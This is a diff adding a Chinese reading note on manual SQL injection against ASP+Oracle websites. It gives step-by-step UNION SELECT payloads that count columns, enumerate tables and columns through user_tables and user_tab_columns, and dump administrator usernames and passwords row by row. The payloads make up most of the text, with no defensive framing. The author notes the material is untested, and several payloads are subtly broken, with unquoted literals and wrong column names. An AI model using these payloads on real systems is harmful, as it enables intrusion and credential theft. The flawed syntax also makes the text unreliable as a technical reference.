@@ -1,0 +1,55 @@
+Oracle手动注入法之一2011-02-14 09:49:00     我来说两句 收藏    我要投稿    [字体：小 大] 本文为读书笔记，未实验检验。
+《非安全》2010,5,P111
+
+注：Oracle中除命令外是大小写敏感的，而user_tables、user_table_columns此二表默认都是大写的。
+1.找注入点
+本文针对：报错关键字：REA-01xxx,目标站搭配：ASP+ORACLE
+
+=================================================================
+2.Order by 判断字段数
+由于Oracle不自动匹配字段数据类型，先用NULL代替，再逐个确定每个字段的数据类型。假如最后得出语句：
+union select 1,2,3,4,5,6,7,null,1,0,11,12 from dual--
+
+假设5可以得到相关信息。
+
+=================================================================
+
+3.爆表爆字段。
+Oracle基本不需爆库，当旁注时才可能用到其他库。
+确定当前库的数据表总数：
+union select 1,2,3,4,to_char(count(table_name)),6,7,null,1,0,11,12 from
+
+user_tables--
+可以在5’处得知数据表总数
+开始爆表名：
+union select 1,2,3,4,table_name,6,7,null,1,0,11,12 from user_tables where
+
+rownum=1--
+union select 1,2,3,4,table_name,6,7,null,1,0,11,12 from user_tables where
+
+rownum=1 and table not in(ADCOLUMN)--
+每爆出一个，就在in()中加入一个。
+
+=================================================================
+
+下面继续爆字段，假如管理员表为BACKUSER
+union select 1,2,3,4,column_name,6,7,null,1,0,11,12 from user_tab_columns where
+
+rownum=1 and table_name=BACKUSER--
+union select 1,2,3,4,column_name,6,7,null,1,0,11,12 from user_tab_columns where
+
+rownum=1 and table=BACKUSER and column not in(GID)--
+每爆出一个，就在in()中加入一个。
+
+=================================================================
+
+4.表名字段名都确定后，开始爆内容。
+假如name,password为关键字段。
+union select 1,2,3,4,name||chr(124)||password,6,7,null,1,0,11,12 from BACKUSER
+
+where rownum=1--
+union select 1,2,3,4,name||chr(124)||password,6,7,null,1,0,11,12 from BACKUSER
+
+where rownum=1 and name<>信息部--
+直到所有内容爆出
+
